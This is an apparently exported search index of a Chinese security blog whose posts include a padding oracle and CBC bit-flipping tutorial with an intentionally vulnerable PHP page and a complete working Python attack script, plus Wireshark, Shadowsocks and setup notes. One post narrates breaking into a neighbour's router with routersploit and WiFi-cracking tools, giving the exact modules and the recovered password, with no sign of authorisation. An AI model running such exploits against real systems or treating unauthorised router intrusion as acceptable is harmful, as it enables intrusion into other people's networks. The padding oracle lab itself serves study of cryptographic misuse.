<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[PaddingOracleAttack原理记录]]></title>
    <url>%2F2018%2F11%2F10%2Fpadding-oracle-attack%2F</url>
    <content type="text"><![CDATA[里面就是一些基本原理以及个人理解 Padding Oracle Attack起因是整理CTF题目时，发现了一道题，所使用的知识点是padding oracle attack，这个攻击以前就听说过，只是还没有学习过，便想借此机会学习一番。奈何readme文档写的太过简单，而其中所给出的脚本使用之后也并不能得到flag。没有办法，只能花费了两天时间从网上搜找相关资料，慢慢研究学习，完善脚本与writeup。 下面步入正题 一、基础知识故名思义，Padding Oracle Attack背后的关键性概念便是加/解密时的填充(Padding)。明文信息可以是任意长度，但是块状加密算法需要所有的信息都由一定数量的数据块组成。为了满足这样的需求，便需要对明文进行填充，这样便可以将它分割为完整的数据块。 CBC密码分组模式我们来看一下CBC（密码分组链接）模式。在CBC模式中，每个明文块（PlainText）先与前一个密文块（CipherText）进行异或，再进行加密（使用key）。在这种方法中，每个密文块都依赖于前面的明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量（IV）进行异或。最后将这n块密文连接起来。 CBC的解密方法则反了过来。先将密文进行解密，然后与前一个密文块进行异或（第一个用IV），得到对应分组的明文。最后再将这n块明文连接起来。 填充规则加密时可以使用多种填充规则，但最常见的填充方式之一是在PKCS#5标准中定义的规则。 PCKS#5的填充方式为：明文的最后一个数据块包含N个字节的填充数据（N取决于明文最后一块的数据长度）。 下面是不同算法所对应的block长度 下图是一些示例，展示了不同长度的单词（FIG、BANANA、AVOCADO、PLANTAIN、PASSIONFRUIT）以及它们使用PKCS#5填充后的结果（在这里，我们假设每个数据块为8字节长） 过程巩固我们来巩固一遍正常情况下的加密和解密过程 加密：先根据所使用的加密算法判断block的大小（一般是8或16字节），根据block的大小来进行分组，最后一个block使用PKCS#5标准填充，这样得到每一块PlainText。然后使用前一块明文（第一个需使用IV）异或，异或后，再使用key和规定的加密算法进行加密，加密完成后，得到CipherText，最后将所有的CipherText连接起来，便是返回的密文了。 解密：根据加密算法得到block的大小，然后进行分组解密得到中间值，中间值与前一组密文（第一个使用IV）异或，异或后得到PlainText，将所有的PlainText连接起来，便是返回的明文了。 二、Padding Oracle Attack攻击原理Padding Oracle Attack是针对CBC链接模式的攻击，和具体的加密算法无关，换句话说，这种攻击方式不是对加密算法的攻击，而是针对算法的使用不当进行的攻击。 攻击者可以根据返回的密文长度来猜测block大小。例：如果返回的长度是24字节，那么block一定不会是16字节，而应该是8字节；如果知晓了加密算法，可以根据上面的对照表来得到block的大小 攻击前提： 攻击者能得到IV和CipherText，并能提交CipherText 攻击者能够触发密文的解密过程，且服务器根据解密结果不同会返回不同的信息 攻击者若能提交IV，便可篡改明文。 服务器的处理与返回假设我们向服务器提交了正确的密码，我们的密码在经过CBC模式加密后传给了服务器，这时服务器会对我们传来的信息尝试解密，如果可以正常解密会返回一个值表示正确，如果不能正常解密则会返回错误。而事实上，判断提交的密文能不能正常解密，第一步就是判断密文最后一组的填充值是否正确，也就是观察最后一组解密得到的结果的最后几位是否符合规范，如果错误将直接返回错误，如果正确，再将解密后的结果与服务器存储的结果比对，判断是不是正确的明文。也就是说服务器一共可能有三种判断结果： 密文不能正常解密（填充错误）； 密文可以正常解密但解密结果不对（填充正确，但得到的明文错误）； 密文可以正常解密并且解密结果比对正确（填充正确，明文正确）； 其中第一种情况与第二三种情况的返回值一定不一样，这就给了我们可乘之机——我们可以利用服务器的返回值判断我们提交的内容能不能正常解密，即判断我们提交的最后一组密文的填充是否符合规范。下面给出了正确与错误的图示 再看一次CBC的解密过程：将CipherText使用key和解密算法解密得到中间值，将中间值与前一组密文（或IV）进行异或得到PlainText。而攻击的前提就是服务器提供CipherText和IV，所以只要我们知道了中间值，便可知道PlainText。这就是Padding Oracle Attack的核心——找出正确的中间值 如何才能找出正确的中间值前面我们说过服务器会根据我们提交的CipherText的解密结果返回不同的三种情况，我们就依据这三种情况（实际上是两种，填充正确和填充不正确）来得到中间值。 我们还是来看上图的例子，假设只有一个block，中间值是不变的，如果我们将IV修改为全0，返回的明文则与中间值完全一样，但这样基本不可能填充正确。我们需要的是最后一位填充0x01，那么经过遍历最后一个字节后发现当最后一字节为0x3C时，页面返回填充正确的结果，即 中间值^0x3C=0x01，中间值=0x01^0x3C=0x3D。 经过上面的步骤便能得到最后一个字节的中间值。得到之后，需要得到倒数第二个字节的中间值，此时将IV的最后一字节变为0x3D^0x02=0x3F，IV的倒数第二个字节进行遍历，发现当倒数第二个字节为0x24时，页面返回填充正确的结果，即 中间值=0x02^0x24=0x26……以此类推，得到完整的中间值。最后将中间值与IV异或，便可得到明文。 上面说的是最简单的情况：只有一个block。当有多个block时，我们从最后一个block入手（因为该算法要先经过key解密得到中间值，而中间值在同一个CipherText下是一定不变的，后面的PlainText受前一个CipherText影响，而前面的PlainText与后面无关，所以需要从后往前走）。单独截取最后一个block，前面一个block填充全0并遍历得到中间值（若有长度限制，必须与正常密文长度相同，则只将到倒数第二个block修改即可）；得到最后一个block的中间值后，将最后一个block舍弃，截取倒数第二个block，前面一个block填充全0并遍历得到中间值（若有长度限制，将倒数第二个block与最后一个block互换位置，互换后的倒数第二个block填充全0并遍历得到中间值）；以此类推，得到所有中间值 我们得到中间值之后，便可得到明文。如果我们还可以控制IV，那么将IV与原明文异或后，再与想得到的明文异或得到新的IV，然后将新的IV提交，便可得到想要的明文。 1234567原理：异或是相同为0，不同为1；0与x异或得到x；IV^中间值=PlainTextIV^中间值^PlainText^PlainTextNew=PlainText^PlainText^PlainTextNew=PlainTextNew其中中间值不变，将IV^PlainText^PlainTextNew后提交即可。这其实就是CBC字节翻转攻击了，具体的原理可以参考其他文章 三、实例为了更好的理解和利用Padding Oracle Attack，我自己编写了一个简单的PHP页面。 主要功能：页面显示加密算法、IV、CipherText，并提供两个提交表单；第一个表单根据提交的cipher返回解密成功或失败；第二个表单要求提交正确的PlainText，然后通过修改iv让PlainText的值变为admin。 流程是先判断提交的plainText是否正确，然后将提交的iv和cipher进行解密，如果解密后得到admin则返回PlainText Changed Success! 页面代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpdefine(&quot;SECRET_KEY&quot;, &quot;thkeyw&quot;); # 加密密钥define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); # 加密算法echo &quot;method:&quot;,METHOD.&quot;&lt;br&gt;&quot;;function get_random_token()&#123; # 生成随机数 $random_token=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $random_token.=chr(rand(1,255)); &#125; return $random_token;&#125;$iv=get_random_token();$plainText=&quot;user&quot;;$cipher=openssl_encrypt($plainText,METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv);echo &quot;iv:&quot;,base64_encode($iv).&quot;&lt;br&gt;&quot;;echo &quot;cipher:&quot;,base64_encode($cipher).&quot;&lt;br&gt;&quot;;?&gt;&lt;div&gt; &lt;p&gt;Try to use Padding Oracle Attack to get plainText first. Put the IV in front of the cipher&lt;/p&gt; &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;p&gt;cipher:&lt;input type=&quot;text&quot; name=&quot;cipher&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;div&gt; &lt;p&gt;Second,give me PlainText and new iv,to make new PlainText to be admin&lt;/p&gt; &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;p&gt;iv:&lt;input type=&quot;text&quot; name=&quot;iv&quot;&gt;&lt;/p&gt; &lt;p&gt;cipher:&lt;input type=&quot;text&quot; name=&quot;cipher&quot;&gt;&lt;/p&gt; &lt;p&gt;plain:&lt;input type=&quot;text&quot; name=&quot;plain&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;?phpif(isset($_POST[&apos;iv&apos;])&amp;&amp;isset($_POST[&apos;plain&apos;])&amp;&amp;isset($_POST[&apos;cipher&apos;]))&#123; # 第二个提交表单，测试CBC字节翻转攻击 if($_POST[&apos;plain&apos;]===$plainText)&#123; $iv_new=base64_decode($_POST[&apos;iv&apos;]); $plainText_new=openssl_decrypt(base64_decode($_POST[&apos;cipher&apos;]),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv_new); if($plainText_new===&apos;admin&apos;)&#123; echo &quot;PlainText Changed Success!&quot;; &#125;else&#123; die(&apos;Let plainText be admin, please!&apos;); &#125; &#125;else&#123; die(&apos;plainText error&apos;); &#125;&#125;elseif(isset($_POST[&apos;cipher&apos;]))&#123; # 第一个提交表单，测试Padding Oracle Attack $cipher_post=base64_decode($_POST[&apos;cipher&apos;]); $ivv=substr($cipher_post,0,16); $cipherr=substr($cipher_post,16); $p=openssl_decrypt($cipherr,METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$ivv); if($p!=&quot;&quot;)&#123; echo &quot;crypt success!&lt;br&gt;&quot;; &#125;else&#123; echo &quot;crypt failed!&lt;br&gt;&quot;; &#125;&#125; 页面显示效果 使用的加密模式是aes-128-cbc，而aes的block大小是16字节，这一点与上面原理部分不同，需要稍稍注意一下。 攻击脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#-*- coding:utf-8 -*-import requests,urllib,base64,reurl=&apos;http://192.168.12.199/test.php&apos;s=requests.session()# 用来进行发包，返回页面结果def inject(var): data=&#123;&apos;cipher&apos;:var&#125; # 必须要用requests，不能用s，因为如果在这里用s，后面循环中会使用，最后会存储一个在break时的值 # 而这个值是错误的，所以这里不能用requests.session。在这里坑了好久 result=requests.post(url,data=data) return result# 字符串异或函数def xor(a,b): ss=&quot;&quot; for i in xrange(len(a)): ss+=chr(ord(a[i])^ord(b[i])) return ss# 使用正则匹配得到页面给出的iv和cipherrepo=s.get(url)iv=re.compile(&quot;iv:(.*?)&lt;br&gt;&quot;).findall(repo.content)[0]cipher=re.compile(&quot;cipher:(.*?)&lt;br&gt;&quot;).findall(repo.content)[0]middle=&quot;&quot; # 中间值# 因16个字节为一组，字符最大到0xff，所以有如下循环# 在进行大批量运算时，xrange比range性能要好for i in xrange(1,17): for j in xrange(0,256): # 根据已经得到的中间值计算下次测试时对应位置的填充值 # 比如已经得到最后一位的中间值，那么计算倒数第二位中间值时，要根据最后一位中间值计算此时最后一位对应的填充值，让明文为0x02 padding=xor(middle,chr(i)*(i-1)) # 前面是0，跟着一字节测试值，跟着已得到中间值所对应的填充值，最后是正常的密文 ever_c=chr(0)*(16-i)+chr(j)+padding+base64.b64decode(cipher) # 判断当前payload是否正常，有可能出现特殊情况 # 比如中间值的倒数第二位本来就是0x02，中间值的倒数第二位计算的结果会先得到0x02，再得到0x01，这种情况下会出错 if len(ever_c)&lt;32: exit(&quot;wrong, please retry&quot;) print ever_c.encode(&apos;hex&apos;) ever_result=inject(base64.b64encode(chr(0)*16+ever_c)) # 判断解密是否正常，正常则得到该位中间值 if &quot;crypt failed&quot; not in ever_result.content: middle=chr(j^i)+middle breakplain=xor(middle,base64.b64decode(iv)) # 明文（包括填充）print &quot;middle:&quot;,middle.encode(&apos;hex&apos;) # 中间值，十六进制方便显示print &quot;plain:&quot;,plainprint &quot;iv:&quot;,ivprint &quot;cipher:&quot;,cipherplainText_new=&apos;admin&apos;+chr(11)*11 # 想要得到的明文iv_new=xor(base64.b64decode(iv),xor(plain,plainText_new)) # 新的iv，提交后便可得到adminprint &quot;iv_new:&quot;,base64.b64encode(iv_new)data=&#123;&apos;plain&apos;:&apos;user&apos;,&apos;iv&apos;:base64.b64encode(iv_new),&apos;cipher&apos;:cipher&#125;print requests.post(url,data=data).content 脚本运行结果： 参考资料http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.htmlhttps://www.freebuf.com/articles/web/15504.htmlhttps://www.freebuf.com/articles/database/151167.htmlhttps://www.csdn.net/article/1970-01-01/289154]]></content>
      <categories>
        <category>CBC攻击</category>
      </categories>
      <tags>
        <tag>PaddingOracleAttack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux挂载Windows共享]]></title>
    <url>%2F2018%2F11%2F10%2Flinux-mount-windows-share%2F</url>
    <content type="text"><![CDATA[如题可以使用1enum4linux 192.168.200.114 扫描是否存在共享 假设windows共享地址为//192.168.200.114/share$ 无需登录的情况映射命令（$需要转义）： 1mount -t cifs -l //192.168.200.114/share\$ /mnt 需要登录的情况映射命令 1mount -t cifs -o username=ge,password=ge -l //192.168.200.114/share\$ /mnt 删除映射命令（退出映射文件夹） 1umount /mnt 如果挂载命令报错 1mount: /mnt: bad option; for several filesystems (e.g nfs, cifs) you might need a /sbin/mount.&lt;type&gt; helper program. 安装一个cifs-utils软件即可。 如果还出错，centos安装nfs-utils samba-client；ubuntu安装nfs-common samba-client 注意，mount/umount命令需要root权限]]></content>
      <categories>
        <category>mount</category>
      </categories>
      <tags>
        <tag>mount</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装操作系统的那些事儿（Nvme SSD）]]></title>
    <url>%2F2018%2F07%2F20%2FInstall-operating-system%2F</url>
    <content type="text"><![CDATA[主要写了一些安装操作系统的说明 安装操作系统的那些事儿（Nvme SSD）前情提要前几天买了一个比较满意的笔记本，8800+RMB。配置如下： 型号：Dell G3 5379 定制版 CPU：i7-8750H RAM：16G DDR4 硬盘：256G Nvme SSD + 1T HD 显卡：GTX 1060MAXQ 6G独显 显示器：15.6英寸 1920*1080 IPS显示屏 笔记本上预装win10家庭版操作系统和正版office 配置方面是很满意的，不满意的就是操作系统是家庭版。除此之外，右击进行刷新时，画面会卡顿一下。挺烦这点的，就想着重装一个win10专业版。以前用的一直都是老版的优启通，这次本来还想继续用这个来装系统的。结果发现PE识别不到固态硬盘！！！ 后来重启N次，也是不行。上网搜索一番之后，发现Nvme的固态硬盘需要win10内核的PE才能识别，而我装的优启通版本过老，最高只到win8内核，所以无法识别到Nvme固态。 找到原因了，那么解决问题就好了。 解决方法 使用UltraISO，将操作系统写入U盘 下载一个内核为win10的PE 直接将操作系统解压到U盘中，双击setup安装 ………… 方法1 使用UltraISO –&gt; 可行具体操作步骤： 1.使用UltraISO打开win10镜像 2.启动–&gt;写入硬盘映像 3.选择要写入的U盘，然后点击’格式化’后，再点击’写入’ 4.写入完成后，重启电脑，进入BIOS，选择从U盘启动，开始windows安装。能够成功识别到Nvme固态 方法2 下载win10内核的PE –&gt; 可行具体操作步骤 去下载优启通最新版/微PE，这两个是我比较喜欢的PE，下面以优启通为例 打开优启通，制作U盘启动盘 制作完成后，将win10镜像放入U盘 重启并选择从U盘启动（不要选择UEFI模式的启动，选择Legacy）启动界面如下，选择Win10PE 这里提一嘴==UEFI==和==Legacy==，这是两种不同的引导方式，win8之后支持快速启动，是新式BIOS即UEFI，同时也支持Legacy；之前是传统BIOS即Legacy。 现在新版电脑都支持UEFI+Legacy双启动模式。UEFI比Legacy开机速度快上不止一倍 原因： 传统Legacy运行流程：新式UEFI运行流程： 两种模式对应的硬盘分区格式 在Legacy启动模式中，硬盘分区格式应该为MBR格式 在UEFI启动模式中，硬盘分区格式应该为GUID(GPT)格式 5.能识别到Nvme固态，安装win10操作系统 方法3 镜像解压到U盘，直接安装 –&gt; 可行这个可行有一个条件，要求必须有一个激活码，输入激活码的步骤不可跳过。]]></content>
      <categories>
        <category>安装系统</category>
      </categories>
      <tags>
        <tag>安装系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用wireshark做数据赛]]></title>
    <url>%2F2018%2F07%2F11%2Fwireshark-and-dataGame%2F</url>
    <content type="text"><![CDATA[简单的说一下数据赛 如何使用wireshark做数据赛序章首先来推荐一本书，《Wireshark数据包分析实战（第二版）》，里面详细讲解了网络基础、wireshark的使用分析方法，并以常见的DHCP、TCP、ARP等协议为样例进行分析讲解。这次主要是说一下大致流程，以及一些做题中可能用到的一些小技巧。 显示过滤器显示过滤器完整列表 简单协议说明在做题中，一般都是有http协议，其余常见协议有ssh、telnet、ftp、mysql、snmp、smtp、https、redis等。这其中http、telnet、ftp、redis是明文传输的；smtp是经过base64编码后传输，相当于明文传输；snmp 2.0及以下都是明文传输，3.0以上才是加密传输；mysql登录时密码是密文，其余均是明文；ssh及https是加密传输，https需要有密钥才能得到明文。 渗透套路说明通常情况下，是从内网抓包，抓到黑客通过某个服务（一般是web）拿到某台服务器的shell，经过一系列操作，扫描内网并拿到内网其他机器的权限。 常见问题 黑客执行的第X条命令是啥 黑客拿到XX权限的时间 XXX的账号密码/密码哈希 服务器或黑客的IP/主机名/MAC地址 路由器IP地址/MAC地址 黑客爆破次数 XX文件内容 黑客所使用的工具 CMS名称及版本 shell地址/密码 ……………… 下次出题可以问TCP序号、确认号、客户端连接端口、会话ID，将路由器放在一个不常见IP上，问路由器IP及MAC地址。感觉网络相关的东西还是蛮重要的，顺便略微提升一下难度。 常见坑 由于服务器有内网地址和外网地址之说，所以提交答案时两个都尝试一次 若是询问到登录时间等与时间有关的问题时，要注意时间有两个时间，一个是请求包时间，一个是响应包时间，两个也可以都提交一次 提交答案时左右两侧不要有空格 前面的问题或答案有可能与后面问题有关，要收集整理 看清楚问题，例：端口分为公认端口、注册端口、动态/私有端口，范围不同 做题技巧简单的介绍一些显示过滤器的使用 过滤url中包含ctf的请求 12http.request.uri contains ctfhttp.request.uri matches &quot;ctf&quot; CMS及其版本号 1http contains &quot;Powered by&quot; 寻找菜刀包 1http.request.method==POST 寻找菜刀返回结果 1http contains &quot;-&gt;|&quot; 寻找redis传输内容 1tcp.port eq 6379 寻找反弹shell的传输内容，例：弹回6666端口 1tcp.port eq 6666 mysql进行管理员相关查询 1mysql matches &quot;select.*?user|admin&quot; 其余的小技巧请自行发掘 做题思路首先需要找到题目入口，即找到黑客IP、服务器IP、常见服务等。可以从wireshark的统计中查找大流量，也可以从日志中寻找攻击相关行为。 找到上面信息之后，可以使用如下显示过滤器来只显示黑客相关数据分组 1ip.addr eq 黑客IP 个人认为应以题目答案为导向，但还需要探寻黑客攻击轨迹，进行要点记录，当后面遇到相关题目时，可以从要点中寻找。 前面有说明渗透套路，基本可以按照该顺序寻找黑客攻击线索。]]></content>
      <categories>
        <category>wireshark</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker的ubuntu 14.04镜像启动mysql失败的解决方法]]></title>
    <url>%2F2018%2F06%2F22%2Fdocker-mysql-solve%2F</url>
    <content type="text"><![CDATA[如题 docker的ubuntu 14.04镜像启动mysql失败的解决方法本来是要测试收到的一道题：dogcms，需要用到docker。在进行docker build时，本来一切顺利，当进展到service mysql start时，出现了错误 来看一下原版的dockerfile使用了ubuntu 14.04的系统，先update了一下，然后安装了lamp环境，然后删除了网站首页index.html，复制了几个文件到网站根目录，然后开启mysql服务，导入sql.sql文件，删除sql.sql文件，启动mysql服务和apache服务 没办法，卡在mysql服务启动，容器也无法创建成功，所以稍微修改了一下dockerfile，将mysql相关的全部删除，成功创建容器，新的dockerfile如下图 再次build，然后run一下便会成功创建容器，使用docker attach进入容器内部 成功进入容器内部后，我们需要找到mysql启动失败的原因，然后想办法解决 首先我尝试了一下在容器内部启动Mysql，果不其然又失败了 然后我们来看一下mysql的错误日志，使用命令tail /var/log/mysql/error.log发现了错误信息180621 7:57:58 [ERROR] Fatal error: Can’t open and lock privilege tables: Got error 14 可以看到，前面都进展的很顺利，结果出了一个错误，直接放到google上面搜索一番，最后还真让我找到了解决方法 RUN chown -R mysql:mysql /var/lib/mysql /var/run/mysqld &amp;&amp; \ service mysql start &amp;&amp; \ mvn -q verify site 看起来貌似就是权限的问题，我就试着执行了一下修改权限的命令，然后启动mysql，居然就这样解决了。 最后，修改一下dockerfile 然后再重新build一下，这次可以看到，全部成功了 再来启动容器然后这套题就部署成功啦~]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wpscan不能用的解决办法]]></title>
    <url>%2F2018%2F03%2F23%2FWpscanResolve%2F</url>
    <content type="text"><![CDATA[在一个新的kali中使用wpscan会发现无法使用，需要进行一下配置 wpscan不能用的解决方法错误信息：[!] You can not run a scan without any databases. Extract the data.zip file. 错误截图： 解决方法：找到一个可用的data.zip，然后解压到/var/lib/wpscan目录中即可 这里提供一个可用的data.zip]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>wpscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php序列化与反序列化范例]]></title>
    <url>%2F2017%2F11%2F10%2Fphp-serialize%2F</url>
    <content type="text"><![CDATA[之前做CTF题的时候遇到了php反序列化的题，由于本人不太会php反序列化，所以稍微学习了一下，这里做出一个范例 php反序列化范例格式个人认为php序列化后的格式应该是这样的： 类型:长度:{类型1:长度1:值1;类型2:长度2:值2;……} 类型一般有： array->a common object->o string->s integer->i boolean->b double->d reference->r custom object->C null->N pointer reference->R unicode string->U class->O 代码123456789101112131415161718192021222324&lt;?phpclass just4fun&#123; var $secret; var $enter;&#125;# 序列化与反序列化范例$o1=new just4fun(); # 实例化该类$o1-&gt;secret=&apos;aaa&apos;; # 给实例中的一些变量赋值$o1_ser=serialize($o1); # 序列化该实例print_r($o1_ser); # 输出序列化后的内容echo(&quot;\n&quot;); # 输出换行，必须用双引号print_r(unserialize($o1_ser)); # 输出反序列化后的内容 echo(&quot;\n&quot;);echo(&quot;\n&quot;);# 序列化与指向引用的结合使用$o2=new just4fun();$o2-&gt;enter=&amp;$o2-&gt;secret; # 此处的enter的值是引用的secret的值，使用符号：&amp;$o2_ser=serialize($o2);print_r($o2_ser);echo(&quot;\n&quot;);print_r(unserialize($o2_ser));echo(&quot;\n&quot;);?&gt; 输出：12345678910111213141516O:8:&quot;just4fun&quot;:2:&#123;s:6:&quot;secret&quot;;s:3:&quot;aaa&quot;;s:5:&quot;enter&quot;;N;&#125;just4fun Object( [secret] =&gt; aaa [enter] =&gt; )O:8:&quot;just4fun&quot;:2:&#123;s:6:&quot;secret&quot;;N;s:5:&quot;enter&quot;;R:2;&#125;just4fun Object( [secret] =&gt; [enter] =&gt; )[Finished in 0.2s]]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搬瓦工搭建ShadowSocks]]></title>
    <url>%2F2017%2F10%2F22%2FConfig-ShadowSocks-Server%2F</url>
    <content type="text"><![CDATA[有很多同学在百度根本搜索不到想要的东西，而Google这个强大的搜索引擎又被墙了，现在很多vpn都被封了，这个时候只能靠我们自己了 用搬瓦工来vps搭建ShadowSocks实现翻墙上网这里使用shadowsocks来完成本实验的目的，使用shadowsocks的前提条件是需要一台有公网ip的计算机，这里的选择有两种：一种是购买公网服务器，另一种就是购买一台vps。我们这里选择使用vps，因为价钱相对较低。 购买vps：Vps的挑选请根据自己经济条件自行选择，我这里选择的是bandwagon，网址为：http://bandwagonhost.com，这里选择2.99（现在搬瓦工已经被墙了，这里推荐使用官方映像地址：https://bwh1.net，火狐可以进行访问，网速可能会很慢，请耐心等候。注意：不能挂代理访问，否则会出现欺诈账单的现象）美元每月的套餐，此套餐已经能满足日常搜索的需求。如果按年购买会便宜很多，点击上图中的OrderNow按钮进入详情页，在上图中选择按年支付，并选择机房位置，然后选择Add to Cart，这里还要多说一点，，从官方的彩蛋信息中，可以看到还可以使用3-5%的优惠码，可以让最终的成本再便宜一点点。当选择加入商品到购物车之后，会有一个让填入优惠码的地方这个优惠码可以直接在网上搜索，找一个折扣最多的即可：结账的时候需要先注册一个用户，我在这里弄了好久，这里说明一下应该怎么填写注册信息需要特别注意的是：注册的资料尽量真实，才不会被搬瓦工判定为账单欺诈Fraud。注册的IP地址在哪个城市，就应该填写对应的省份、城市，比如：深圳的IP注册，就应该填写广东、深圳市，成功概率高，乱填就麻烦，容易出现账单欺诈。还有一些骚年，那真是马虎大意，挂上美国VPS或者远程桌面到国外VPS上注册，明显IP不是中国国内的呀，还填写中国的地址，不被判账单欺诈Fraud才怪。切记这些小结，就可以注册成功。根据上图所示，我们可以注册个人信息，需要注意几点。A - 所有填写的信息都必须用拼音填写B - 资料是否完全真实无所谓，姓名可以随意，邮箱必须自己的，以免以后找回密码需要C - 国家、地区、省份必须真实，地址你随意填写，电话也可以随意很多人都是因为这里的问题导致无法付款，很多欺诈订单的用户可能会填写其他国家的信息，这是万万不可的，而且不能用V=P=N软件更换IP购买，你就老老实实用真实的IP购买就可以。如果没有问题的话就结账吧(Checkout)：这里支持使用支付宝来支付，后面的步骤就和正常买东西一样了。支付成功后，在最底部选择我的服务： 然后点击控制面板按钮：这个面板里面包含了控制vps的功能，甚至包括了shell功能，如果你不喜欢用页面控制shell也可以使用putty等客户端来连接此vps。购买完成后被预安装的系统为Centos6 ，可以在面板中安装不同的系统，我们这里不做更改。 安装Shadowsocks Server面板安装在KiwiVM的面板中已经存在了安装Shadowsocks Server的功能： 但是此功能只支持Centos系统： 使用面板安装十分方便，只需短短时间就能够直接使用： 命令安装这里讲解使用命令安装Shadowsocks Server（前面用面板装上的可以忽略这里了），使用putty连接到vps上，root密码可以在控制面板中设置。 安装命令如下： 12345yum install epel-releaseyum updateyum install python-setuptools m2crypto supervisoreasy_install pippip install shadowsocks 全部安装完成后，继续执行命令vi1/etc/shadowsocks.json： 然后一次性复制下面的内容（复制之前记得修改443和yourpassword为你自己的端口号和密码，此端口号不是你的SSH端口号，而是你在手机或电脑上的shadowsocks客户端连接VPS上搭建的服务端的端口号，范围 1 - 65535 ，只要不和现有的端口号如SSH端口冲突都可以，记下你修改的端口号和密码）， ———-以下内容为复制内容———- 12345678&#123; &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;server_port&quot;:443, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;yourpassword&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;aes-256-cfb&quot;&#125; ———-以上内容为复制内容———-继续执行命令 1vi /etc/supervisord.conf ———-以下内容为复制内容———- 1234567[program:shadowsocks]command=ssserver -c /etc/shadowsocks.jsonautostart=trueautorestart=trueuser=rootlog_stderr=truelogfile=/var/log/shadowsocks.log ———-以上内容为复制内容———-继续执行命令 1vi /etc/rc.local 在此文件中填写 1service supervisord start 退出后执行reboot来重新启动vps。 配置Shadowsocks客户端Windows用户可以从https://github.com/shadowsocksr/shadowsocksr-csharp/releases下载Shadowsocks客户端，最新版的目录结构为：因为是C#写的，所以需要dotnet库，可以根据自己的实际情况来选择dotnet版本，此软件是绿色软件，直接运行exe即可。并根据自己vps中的设置来填写相关信息：点击确定后，软件会最小化到任务栏窗口，Shadowsocks的默认端口为1080，接下来就可以使用代理软件来连接了。 配置firefox：首先在firefox中安装FoxyProxy Standard这个插件，在其中新建一个代理，内容如下：确定后并在插件中启动此代理就可以了访问一下谷歌： 声明本篇博客只为翻墙搜索学术相关内容而坐，如有人拿来做不法的事情与博主无关。]]></content>
      <categories>
        <category>ShadowSocks</category>
      </categories>
      <tags>
        <tag>ShadowSocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一次获取邻居路由器的管理权限]]></title>
    <url>%2F2017%2F10%2F08%2FRouterSploit%2F</url>
    <content type="text"><![CDATA[如题 一次获取邻居路由器的管理权限首先要获得密码，连接上对方的wifi，可以用wifi万能钥匙，或者aircrack-ng获取，具体过程不再述说 打开kali，安装routersploit工具： 1git clone https://github.com/reverse-shell/routersploit 安装完成后，进入安装目录下： 1./rsf.py 成功启动会有如下界面： 进行一些配置 123456先加载自动扫描模块：use scanners/autopwn设置目标路由器IP：set target 192.168.168.1进行扫描：exploit 截图中我们可以看到，有两个存在的漏洞 先加载第一个漏洞尝试一下 12345use exploits/routers/zyxel/zywall_usg_extract_hashes设置目标：set target 192.168.168.1检查是否可利用：check 结果是不能利用 再加载第二个利用模块： 12345use exploits/routers/tplink/wdr842nd_wdr842n_configure_disclosure设置目标：set target 192.168.168.1检查是否可利用：check 显示可以利用，我们进行攻击 1exploit OK，成功得到目标路由器的登录密码在浏览器中输入192.168.168.1，输入登录密码：654321成功登陆：]]></content>
      <categories>
        <category>无线</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>无线</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome使用进阶]]></title>
    <url>%2F2017%2F10%2F08%2FChromeAdvanced%2F</url>
    <content type="text"><![CDATA[文章里介绍了一些好用插件和快捷键 Chrome使用进阶插件：Set Character Encoding有的版本的Chrome在更多工具和高级里没有修改编码的选项，这个时候就需要安装这个插件了，使用方法：右击页面，选择需要的编码即可 Tampermonkey俗称“油猴”脚本，用来添加实用脚本的插件，点击后可以查看当前页面使用的脚本，可以开启或关闭。管理面板（仪表盘）——》是用来管理所有安装脚本的。添加新脚本——》是直接添加脚本代码，如果你有好的脚本代码可以使用添加新脚本。获取新脚本——》如果你想要使用别人做好的现成的脚本，就需要点击获取新脚本了。其中最好用的是GreasyFork网站，里面的好用脚本挺多的，像：百度云解除大文件下载限制、在线解析VIP视频、跳过验证码等待、解除页面右键限制等等，刚开始访问起来有点慢，请耐心等候。 Proxy SwitchyOmega很好用的代理工具，可以添加代理，并自己设置代理使用条件 HackBar感觉不如火狐上的好用，凑合使用一下还是可以的 有道云笔记网页简报方便快捷的把网页内容或整个网页保存到有道云笔记中 印象笔记.剪藏同上，保存到印象笔记中 修改HTTP头方便的修改或添加HTTP请求头内容 User-Agent Switcher for Chrome修改User-Agent的插件，17-9-10爆出User-Agent Switcher for Google 